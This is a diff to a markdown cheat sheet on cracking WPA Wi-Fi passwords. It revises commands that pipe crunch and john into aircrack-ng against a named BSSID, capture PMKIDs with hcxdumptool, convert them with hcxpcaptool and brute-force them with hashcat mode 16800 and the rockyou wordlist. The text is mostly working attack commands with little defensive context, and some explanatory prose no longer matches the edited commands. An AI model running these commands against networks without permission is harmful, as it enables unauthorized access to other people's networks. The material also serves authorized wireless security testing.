@@ -15,7 +15,7 @@
 
 Use john to keep a session of aircrack when used with huge wordlist:
 
-		crunch 8 8 | john --stdin --wordlist=password.lst --stdout --session=sessname | aircrack-ng -b C0:25:E9:62:CE:E5 psk-01.cap -w -
+	crunch 8 8 | john --stdin --wordlist=password.lst --stdout --session=sessname | aircrack-ng -b C0:25:E9:62:CE:E5 psk-01.cap -w -
 
 
 ## John & Aircrack:
@@ -62,6 +62,10 @@ In this case we use Hxctools & Hashcat to capture packets and crack the password
 Install Hxctools & Hashcat:
 
 	sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev
+
+MacOs Install:
+
+	brew install hashcat hxctools
 	
 On your Git folder:
 
@@ -83,7 +87,7 @@ Use Hxcdump to Capture PMKIDs from Local Networks
 
 	airmon-ng start wlan0
 	
-	hcxdumptool -i wlan0mon -o galleria.pcapng --enable__status=1
+	hcxdumptool -i wlan0mon -o capture.pcapng --enable__status=1
 
 -i tells the program which interface we are using, in this case, wlan0mon. The filename we'll be saving the results to can be specified with the -o flag argument. The channel we want to scan on can be indicated with the -c flag followed by the number of the channel to scan.
 
@@ -91,19 +95,21 @@ Use Hxcpcaptool to Convert the Dump for Hashcat:
 
 To convert our PCAPNG file, we'll use hcxpcaptool with a few arguments specified. In the same folder that your .PCAPNG file is saved, run the following command in a terminal window.
 
-	hcxpcaptool -E essidlist -I identitylist -U usernamelist -z galleriaHC.16800 galleria.pcapng
+	hcxpcaptool -z hash capture.pcapng
+
+	hcxpcaptool -E essidlist -I identitylist -U usernamelist -z hash capture.pcapng
 
 This command is telling hxcpcaptool to use the information included in the file to help Hashcat understand it with the -E, -I, and -U flags. The -Z flag is used for the name of the newly converted file for Hashcat to use, and the last part of the command is the PCAPNG file we want to convert.
 
 Select a Password List & Brute Force with Hashcat:
 
-	hashcat -m 16800 galleriaHC.16800 -a 0 --kernel-accel=1 -w 4 --force 'topwifipass.txt' > out.txt
+	hashcat -m 16800 --force hash /home/user/Downloads/rockyou.txt.txt -w 4 -a 0
 
-	hashcat -m 16800 --force final.txt /home/user/Downloads/Top353Million-probable-v2.txt > out.txt
+	hashcat -m 16800 --force hash /home/user/Downloads/rockyou.txt.txt > out.txt
 
-	hashcat -m 16800 --force final.txt /home/user/Downloads/Top353Million-probable-v2.txt --show
+	hashcat -m 16800 --force hash /home/user/Downloads/rockyou.txt.txt --show
 	
-In this command, we are starting Hashcat in 16800 mode, which is for attacking WPA-PMKID-PBKDF2 network protocols. Next, we'll specify the name of the file we want to crack, in this case, "galleriaHC.16800." The -a flag tells us which types of attack to use, in this case, a "straight" attack, and then the -w and --kernel-accel=1 flags specifies the highest performance workload profile. If your computer suffers performance issues, you can lower the number in the -w argument.
+In this command, we are starting Hashcat in 16800 mode, which is for attacking WPA-PMKID-PBKDF2 network protocols. Next, we'll specify the name of the file we want to crack, in this case, "HC.16800." The -a flag tells us which types of attack to use, in this case, a "straight" attack, and then the -w and --kernel-accel=1 flags specifies the highest performance workload profile. If your computer suffers performance issues, you can lower the number in the -w argument.
 
 Next, the --force option ignores any warnings to proceed with the attack, and the last part of the command specifies the password list we're using to try to brute force the PMKIDs in our file, in this case, called "topwifipass.txt."
 
